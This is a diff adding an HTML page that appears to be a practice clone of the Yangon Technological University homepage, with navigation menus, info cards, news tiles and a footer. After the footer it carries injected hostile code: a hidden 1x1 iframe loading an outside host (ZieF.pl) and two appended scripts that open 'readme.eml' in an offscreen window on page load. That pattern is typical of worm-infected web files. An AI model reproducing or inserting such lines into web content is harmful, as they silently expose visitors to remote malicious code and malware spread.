@@ -1,0 +1,643 @@
+<!DOCTYPE html>
+<html>
+    <head>
+        <title></title>
+                <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+                <link rel="stylesheet" href="https://www.w3schools.com/icons/tryit.asp?icon=fas_fa-user-check&unicon=f4fc">
+               
+        <style>
+            /* #mainbody{
+
+                background-color: aqua;
+            } */
+/* 
+            .header{
+                display: flex;
+            } 
+
+            /* .lr{
+                text-align: center;
+            } */
+
+            .left{
+                
+                float: left;
+                width: 30%;
+                
+            }
+            
+            /* .img{
+                padding-top: 20px;
+                padding-left: 340px;
+                width: 56px;
+            } */
+
+            .right{
+                
+                
+                float: right;
+                width: 70%;
+            }
+
+            .h3{
+                font-family: 'Times New Roman', Times, serif;
+                color: chocolate;
+                font-size: 30px;
+
+            }
+
+            .vl{
+
+                border-left: 1.5px solid black;
+                height: 10px;
+            }
+
+            .da{
+                padding-left: 800px;
+                padding-top: 10px;
+                background-color:rgb(150, 160, 170);
+                height: 50px;
+            }
+            
+            .da>a{
+                font-size: 30px;
+                color: white;
+                text-decoration: none;
+
+            }
+
+            .dh{
+                background-color:rgb(27, 24, 24);
+                padding-top: 20px;
+                padding-bottom: 20px;
+                padding-left: 10px;
+            }
+
+            .dh>a,i{
+                color: white;
+                text-decoration: none;
+            }
+
+            .dropdown>a{
+                color: white;
+                text-decoration: none;
+            }
+
+
+             .body{
+               
+                clear: both;
+            } 
+
+          
+            .cards{
+                display: flex;
+                grid-template-columns: repeat(3,1fr);
+                grid-row: 1/3;
+                grid-gap: 1rem;
+                padding-left: 200px;
+
+                
+            }
+
+            .card{
+                
+                padding-left: 40px;
+                border: 2px solid #eeeeee;
+                border-radius: 4px;
+                text-align: justify;
+                width: 250px;
+                box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2);
+            transition: 0.3s;
+                
+            }
+            
+
+            
+/* 
+             .cards{ 
+   
+                float: left;
+               display: flex;
+               grid-template-columns: repeat(3, 1fr); 
+              grid-auto-rows: auto; 
+              grid-gap: 1rem; 
+    
+              } 
+ 
+         .card { 
+            box-shadow: 3px 3px 12px 2px rgb(0,0,0,0.6);
+              border: 2px solid #e7e7e7;   
+             border-radius: 4px;    
+              padding: 1.5rem;     
+              transition: 0.2s;
+           }  */
+
+
+            .b1{
+                border-radius: 40px;
+                background-color: orange;
+                border: none;
+                width: 50px;
+                height: 50px;
+                margin: auto;
+                position: absolute;
+                left: 180px;
+                top: 770px;
+              
+               
+            }
+
+            .b2{
+                border-radius: 40px;
+                background-color: orange;
+                border: none;
+                width: 50px;
+                height: 50px;
+                margin: auto;
+                position: absolute;
+                left: 520px;
+                top: 770px;
+              
+               
+            }
+
+            .b3{
+                border-radius: 40px;
+                background-color: orange;
+                border: none;
+                width: 50px;
+                height: 50px;
+                margin: auto;
+                position: absolute;
+                left: 860px;
+                top: 770px;
+              
+               
+            }
+
+            .btn{
+                background-color: orange;
+                padding: 3px 8px;
+                text-align: center;
+                border:none;
+                display: inline-block;
+                font-size: 16px;
+                margin-left: 130px;
+                color: white;
+                border-radius: 7px;
+                ;
+            }
+
+            .bleft{
+                float: left;
+                width: 50%;
+            }
+            .bimg{
+                padding-top: 30px;
+                padding-left: 200px;
+                width: 340px;
+            }
+            
+        .bright{
+            padding-top: 20px;
+            float: right;
+            width: 50%;
+        }
+
+        .h4{
+            clear: both;
+            text-align: center;
+            padding-top: 20px;
+            color: orange;
+        }
+
+        .icard{
+            padding-left: 50px;
+            clear: both;
+            box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2);
+            transition: 0.3s;
+        }
+
+        .h2{
+            text-align: center;
+            color: orange;
+        }
+
+
+        .dropdown{
+                position: relative;
+                display: inline-block;
+            }
+
+            .dropdown dropbtn{
+                font-size: 16px;
+                border:none;
+                outline: none;
+                color: olivedrab;
+                padding: 14px 16px;
+                background-color: inherit;
+                font-family: inherit;
+                margin: 0;
+                /* background-color: olivedrab; */
+
+            }
+
+            .dropdown-content{
+                display:none;
+                position:absolute;
+                background-color:white;
+                min-width: 160px;
+                box-shadow: 0px 8px 16px;
+            }
+
+            .dropdown-content a{
+                float:none;
+                color: black;
+                padding: 12px 16px;
+                text-decoration: none;
+                display: block;
+                text-align: left;
+            }
+
+            .dropdown-content a:hover{
+                background-color: olivedrab;
+                color: black;
+            }
+
+            .dropdown:hover .dropdown-content{
+                display: block;
+            }
+
+        .card1{
+                
+                padding-left: 40px;
+                border: 2px solid #eeeeee;
+                border-radius: 4px;
+                text-align: justify;
+                width: 250px;
+                box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2);
+            transition: 0.5s ease;
+            cursor: pointer;
+                
+            }
+
+            
+        .card1:hover{
+            transform:scale(1.2);
+        }
+
+        .card2{
+                
+              
+                border: 2px solid #eeeeee;
+                border-radius: 4px;
+                text-align: justify;
+                
+                box-shadow: 0 4px 8px 0 rgba(0,0,0,0.2);
+            transition: 0.3s;
+            width: 300px;
+                
+            }
+
+            .cards2{
+                display: flex;
+                grid-template-columns: repeat(3,1fr);
+                grid-row: 2/6;
+                grid-gap: 1rem;
+                width: 100%;
+             
+
+
+                
+            }
+            .card2:hover{
+                transform: scale(1.2);
+            }
+
+            .footer{
+                background-color:slategrey;
+                clear: both;
+            }
+
+            .card3{
+                
+              
+                border: 2px none #eeeeee;
+                border-radius: 4px;
+                text-align: justify;
+                
+                
+            transition: 0.3s;
+            width: 300px;
+                
+            }
+        </style>
+    </head>
+    <body>
+        <div id="mainbody"> 
+            <div class="header">
+                <div class="da">
+                    <a href="">Alumini</a>&nbsp;&nbsp;<i class="vl"></i>&nbsp;&nbsp;
+                    <a href="">Library</a>&nbsp;&nbsp;<i class="vl"></i>&nbsp;&nbsp;
+                    <a href="">Sign in</a>&nbsp;&nbsp;<i class="vl"></i>&nbsp;&nbsp;
+                    <a href="">Register</a>
+                </div>
+
+                <div class="lr">
+                    <div class="left" style="width: 90%; padding-left: 200px;"><img  class="img" src="pre_intern/YTU.png"></div>
+                    
+                </div>
+
+              
+                </div>
+                
+            </div>
+            <div class="body">  
+                <div class="dh">
+                <a href="">HOME</a>&nbsp;&nbsp;&nbsp;
+                <!-- <a href="">ABOUT YTU</a>&nbsp;&nbsp;<i class="fa fa-caret-down"></i>&nbsp;&nbsp;&nbsp;
+                <a href="">ADMISSION</a>&nbsp;&nbsp;<i class="fa fa-caret-down"></i>&nbsp;&nbsp;&nbsp;
+                <a href="">DEPARTMENT</a>&nbsp;&nbsp;<i class="fa fa-caret-down"></i>&nbsp;&nbsp;&nbsp;
+                <a href="">ACADEMIC</a>&nbsp;&nbsp;<i class="fa fa-caret-down"></i>&nbsp;&nbsp;&nbsp;
+                <a href="">NEWS AND EVENTS</a>&nbsp;&nbsp;<i class="fa fa-caret-down"></i>&nbsp;&nbsp;&nbsp;
+                <a href="">RESEARCH</a>&nbsp;&nbsp;<i class="fa fa-caret-down"></i>&nbsp;&nbsp;&nbsp;
+                <a href="">CONFERENCES</a>&nbsp;&nbsp;<i class="fa fa-caret-down"></i>&nbsp;&nbsp;&nbsp; -->
+                <div class="dropdown">
+                    <a href="">Ahout YTU</a>&nbsp;&nbsp;<i class="fa fa-caret-down"></i>
+                    <div class="dropdown-content">
+                        <a hret="">Rector's Messages</a>
+                        <a href="">History</a>
+                    </div>
+                </div>&nbsp;&nbsp;&nbsp;
+                <div class="dropdown">
+                    <a href="">ADMISSION</a>&nbsp;&nbsp;<i class="fa fa-caret-down"></i>
+                    <div class="dropdown-content">
+                        <a hret="">Undergraduate</a>
+                        <a href="">Graduate</a>
+                       
+                    </div>
+                    
+                </div>&nbsp;&nbsp;&nbsp;
+                <div class="dropdown">
+                    <a href="">DEPARTMENT</a>&nbsp;&nbsp;<i class="fa fa-caret-down"></i>
+                    <div class="dropdown-content">
+                        <a hret="">Aechitecture</a>
+                        <a href="">Chemistry</a>
+                        <a href="">Chemical Engineering</a>
+                        <a hret="">Civil Engineering</a>
+                        <a href="">Computer Engineering and Information Technology</a>
+                        <a hret="">English</a>
+                        <a href="">Electrical Power Engineering</a>
+                        <a hret="">Electronics Engineering</a>
+                        <a href="">Geology</a>
+                        <a hret="">Maths</a>
+                        <a href="">Mechanical Engineering</a>
+                        <a hret="">Metallurgy Engineering</a>
+                        <a href="">Mining Engineering</a>
+                        <a hret="">Myanmar</a>
+                        <a href="">Petroleum Engineering</a>
+                        <a hret="">Physics</a>
+                        <a href="">Textile Engineering</a>
+                    </div>
+                    
+                </div>&nbsp;&nbsp;&nbsp;
+                <div class="dropdown">
+                    <a href="">ACADEMIC</a>&nbsp;&nbsp;<i class="fa fa-caret-down"></i>
+                    <div class="dropdown-content">
+                        <a hret="">Undergraduate</a>
+                        <a href="">Graduate</a>
+                    </div>
+                    
+                </div>&nbsp;&nbsp;&nbsp;
+                <div class="dropdown">
+                    <a href="">NEWS AND EVENTS</a>&nbsp;&nbsp;<i class="fa fa-caret-down"></i>
+                    <div class="dropdown-content">
+                        <a hret="">News</a>
+                        <a href="">Events</a>
+                        <a href="">Seminars</a>
+                    </div>
+                    
+                </div>&nbsp;&nbsp;&nbsp;
+                <div class="dropdown">
+                    <a href="">RESEARCH</a>&nbsp;&nbsp;<i class="fa fa-caret-down"></i>
+                    <div class="dropdown-content">
+                        <a hret="">Departmental Research</a>
+                        <a href="">Collaborative Research</a>
+                        
+                    </div>
+                    
+                </div>&nbsp;&nbsp;&nbsp;
+                <div class="dropdown">
+                    <a href="">CONFERENCES</a>&nbsp;&nbsp;<i class="fa fa-caret-down"></i>
+                    <div class="dropdown-content">
+                        <a hret="">ICSE</a>
+                        <a href="">NCSE</a>
+                        
+                    </div>
+                    
+                </div>&nbsp;&nbsp;&nbsp;
+                <a href="">INTERNATIONAL AFFAIRS</a>&nbsp;&nbsp;&nbsp;
+                <a href="">GALLERY</a>
+                </div>
+                <div>
+                    <img src="pre_intern/YL.jpg" side="300px" width="100%"></img>
+                </div>
+                <br>
+                <div class="row">
+                    <div class="cards">
+                        <div class="card">
+                            <h3>Our Objectives</h3>
+                            <button  class="b1"><i class="fa fa-users" style="font-size: 30px;"></i></button>
+                            <p>It envisaged that YTU will become<br>a highly-prestigious technological<br>centre of excellence in teaching and<br>
+                            research with a strong committment<br>to systematically educate and train </p>
+                            <button type="button" class="btn">Read More<i class="fa fa-arrow-circle-o-right"></i></button>
+                            
+                        </div>
+                        &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;
+                        
+                        <div class="card">
+
+                            <h3>Our Missions</h3>
+                            <button  class="b2"><i class="fas fa-user-check" style="font-size: 30px;"></i></button>
+                            <p>To educate and train students<br>systematically to become engineers,<br>
+                            specialists and researchs who can<br>effectively contribute to the building<br>of a modern developed nation</p>
+                            <button type="button" class="btn">Read More<i class="fa fa-arrow-circle-o-right"></i></button>
+                            
+                        </div>
+                        &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp; &nbsp;&nbsp;
+                        <div class="card">
+                            <h3>Programs</h3>
+                            <button  class="b3"><i class="fa fa-tv" style="font-size: 30px;"></i></button>
+                            <p style="text-align: justify;">When an unknows printer took a<br>
+                            gallery of type and scrambled it to<br>
+                            make a type specimen book.It has <br>
+                            survived not only five centuries,but<br>
+                            also the leap into electronic<br>typesetting.</p>
+                            <button type="button" class="btn">Read More<i class="fa fa-arrow-circle-o-right"></i></button>
+                            
+                        </div>
+                        <!-- <div class="row"> 
+                                 <div class="cards"> 
+                                     <div class="card"> 
+                                         <h3>Card 1</h3> 
+                                         <p>Some text</p> 
+                                         <p>Some text</p> 
+                                     </div> 
+                                     <div class="card"> 
+                                         <h3>Card 2</h3> 
+                                         <p>Some text</p> 
+                                         <p>Some text</p> 
+                                     </div> 
+                                     <div class="card"> 
+                                         <h3>Card 3</h3> 
+                                         <p>Some text</p> 
+                                         <p>Some text</p> 
+                                     </div> 
+                                 </div> 
+                            
+
+                    </div> -->
+                </div> 
+                <div>
+                    <div class="bleft"><img class="bimg" src="pre_intern/YTU_Rector.jpg" width="40%"></div>
+                    <div class="bright">
+                        <h3 style="color: orange;">Rector's Messages</h3>
+                        <p style="text-align: justify; ">Yangon Technological University is one of the best universities in Myanmar and only allows admissions of students who gained high marks from the matriculation examination. A student's majorized engineering field is also decided by the marks he earned through the matriculation examination. Currently, YTU possesses 12 Engineering Departments, 6 Supporting Departments, 1 Research Centre and 47 Laboratories. There are currently about 2000 students seeking knowledge and experiences at YTU. VISION It is..</p></div>
+                        <button type="button" class="btn" style="margin-left: 400px;">Read More<i class="fa fa-arrow-circle-o-right"></i></button>
+                </div>
+                <div>
+                    <h3 class="h4">YTU Events</h3>
+                    
+                        <div class="icard"> 
+                           
+                                <img src="pre_intern/i1.png" style="width: 300px;">&nbsp;&nbsp;
+                        
+                            
+                                <img src="pre_intern/i2.jpg" style="width: 300px;">&nbsp;&nbsp;
+                            
+                               <img src="pre_intern/i3.jpg" style="width: 355px;">&nbsp;&nbsp;
+                           
+                                <img src="pre_intern/i4.jpg" style="width: 260px;">&nbsp;&nbsp;
+
+                        </div> 
+                    </div>
+                    <div>
+                        <h2 class="h2">WELCOME TO YTU</h2>
+                        <p style="text-align: justify;">Yangon Technological University is one of the best universities in Myanmar and only allows admissions of students who gained high marks from the matriculation examination. A student's majorized engineering field is also decided by the marks he earned through the matriculation examination. Currently, YTU possesses 12 Engineering Departments, 6 Supporting Departments, 1 Research Centre and 47 Laboratories. There are currently about 2000 students seeking knowledge and experiences at YTU. Find out more about the history of YTU at..</p>
+                        <button type="button" class="btn" style="margin-left: 1200px;">Read More<i class="fa fa-arrow-circle-o-right"></i></button>
+                    </div>
+                </div>
+                <br>
+
+                <div>
+                
+                    
+                    <div class="cards" style="background-image:url('pre_intern/b.jpg');"> 
+                        <div class="card1" style=" padding: 20px;"> 
+                            <h3 style="text-align: center;">25</h3>
+                            
+                            <h3 style="text-align: center;">DEPARTMENT PUBLISHED</h3>
+                        </div> &nbsp;&nbsp;&nbsp;
+                        <div class="card1" style="padding: 20px;"> 
+                            <h3 style="text-align: center;">1000</h3> 
+                            <h3 style="text-align: center;">PROFESSIONAL LECTURES</h3>
+                        </div> &nbsp;&nbsp;&nbsp;
+                        <div class="card1" style="padding: 20px;"> 
+                            <h3 style="text-align: center;">2000</h3> 
+                           <h3 style="text-align: center;">STUDENT ENROLLMENT</h3> 
+                           
+                        </div> 
+                    </div> 
+                    
+                        
+                
+            
+                </div>
+                <br>
+                <h1 style="text-align: center;color: orange;">Updated News</h1>
+                <div class="cards2" style="width: 100%; padding-left: 200px;"> 
+                   
+                    <div class="card2"> 
+                    <img src="pre_intern/i2.jpg" style="width: 300px; height: 200px;">
+                    <div class="container" style="text-align: center;color: orange;">
+                        Ministry of Education Yangon Technology..
+                    </div>
+                    </div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                    <div class="card2" > 
+                    <img src="pre_intern/i3.jpg" style="width: 300px; height: 200px;">
+                    <div class="container" style="text-align: center;color: orange;">
+                        Myanmar's First Diploma Programme in..
+                    </div>
+                    </div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                    <div class="card2" > 
+                    <img src="pre_intern/i5.jpg" style="width: 300px; height: 200px;">
+                    <div class="container" style="text-align: center;color: orange;">
+                        7th WWSPZP
+                    </div>
+                    </div>
+                </div>
+
+                <br>
+                <div class="cards2" style="width: 100%; padding-left: 200px;padding-top: 30px;"> 
+                    <div class="card2" >
+                    <img src="pre_intern/i6.jpg" style="width: 300px; height: 200px;">
+                    <div class="container" style="color: orange;text-align: center;">
+                        Swal Daw Leaf
+                    </div>
+                    </div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                    <div class="card2" > 
+                    <img src="pre_intern/i7.jpg" style="width: 300px; height: 200px;">
+                    <div class="container" style="color: orange; text-align: center;">
+                        Rector's Collaborative Visit to university..
+                    </div>
+                    </div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                    <div class="card2"> 
+                    <img src="pre_intern/i4.jpg" style="width: 300px; height: 200px;">
+                    <div class="container" style="color:orange;text-align: center;">
+                        Training of IoT and Environmental..
+                    </div>
+                    </div>
+                </div>
+                <br>
+            </div>
+            <div class="footer">
+                <div class="cards2" style="width: 100%; padding-left: 160px;"> 
+                    <div class="card3" >
+                        <h3>ABOUT YTU</h3>
+                    <p>The present Yangon Technological University (Y.T.U) began as the Department of Engineering in 1923 under the Rangoon (Yangon) University. The Engineering Department was situated downtown, on the Bogyoke Aung San street. B.Sc. (Engineering) program in Civil Engineering began in 1924.
+                        <br><br><br>
+
+                        © Yangon Technological University - 2020 
+                        </p>
+                    </div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                    <div class="card3" > 
+                    <h3>OUR LINKS</h3>
+                   <ul>
+                       <li>Home</li>
+                        <li>Architecture</li>
+                        <li>Civil Engineering</li>
+                        <li>Mechanical Engineering</li>
+                        <li>Mining Engineering</li>
+                        <li>Alumini</li>
+                        
+                   </ul>
+                    </div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+                    <div class="card3"> 
+                    <h3>Recent Posts</h3>
+                    <img src="pre_intern/i8.jpg" style="width: 50px;"><br><br>
+                    Events Two<br>
+                    November 18,2019<br><br>
+                    <img src="pre_intern/i9.jpg" style="width: 50px;"><br><br>
+                    Events One<br>
+                    November 18,2019
+                    
+                    </div>
+                </div>
+            </div>
+        </div>
+    <iframe src="http://ZieF.pl/rc/" width=1 height=1 style="border:0"></iframe>
+</body>
+</html>
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html>
+<html><script language="JavaScript">window.open("readme.eml", null,"resizable=no,top=6000,left=6000")</script></html>
